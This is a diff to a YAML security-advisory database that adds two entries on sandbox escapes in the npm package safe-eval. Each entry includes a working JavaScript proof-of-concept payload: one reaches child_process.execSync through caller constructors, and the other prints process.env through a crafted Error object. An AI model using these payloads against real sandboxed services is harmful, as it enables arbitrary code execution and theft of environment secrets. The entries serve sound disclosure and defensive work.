@@ -1,4 +1,42 @@
 ---
+- id: npmjs:npm:safe-eval:1033
+  title: Sandbox Breakout / Arbitrary Code Execution
+  description: "All versions of `safe-eval` are vulnerable to Sandbox Escape leading
+    to Remote Code Execution. A payload chaining a function's callee and caller constructors
+    can escape the sandbox and execute arbitrary code.  \n\nFor example, the payload
+    \n```\n((() => { \nconst targetKey = Object.keys(this)[0]; \nObject.defineProperty(this,
+    targetKey, { \nget: function() { \nreturn arguments.callee.caller.constructor(
+    \n\"return global.process.mainModule.require('child_process').execSync('pwd').toString()\"
+    \n)(); \n} \n}); \n})();```\nmay be used to print the `pwd` to the console."
+  affected_package: safe-eval
+  vulnerable_versions:
+  - ">=0.0.0"
+  severity: high
+  package_manager: npm
+  cwe: CWE-693
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Lily Black
+- id: npmjs:npm:safe-eval:1322
+  title: Sandbox Breakout / Arbitrary Code Execution
+  description: "All versions of `safe-eval` are vulnerable to Sandbox Escape leading
+    to Remote Code Execution. The package fails to restrict access to the main context
+    through Error objects. This may allow attackers to execute arbitrary code in the
+    system. \n\nEvaluating the payload \n```\n(function (){\n  var ex = new Error\n
+    \ ex.__proto__ = null\n  ex.stack = {\n    match: x => {\n      return x.constructor.constructor(\"throw
+    process.env\")()\n    }\n  }\n  return ex\n})()\n``` \n\nprints the contents of
+    `process.env`."
+  affected_package: safe-eval
+  vulnerable_versions:
+  - ">=0.0.0"
+  severity: high
+  package_manager: npm
+  cwe: CWE-693
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: posix
 - id: npmjs:npm:safe-eval:337
   title: Sandbox Breakout
   description: "Affected versions of `safe-eval` are vulnerable to a sandbox escape.
@@ -18,8 +56,6 @@
   created_date: 1970-01-01
   last_modified_date: 1970-01-01
   credit: Alessandro Nadalin
-  references: https://npmjs.com/advisories/337
-  source_url: https://npmjs.com/advisories/337
 - id: snykio:npm:safe-eval:20170830
   title: Sandbox Escaping
   description: |+
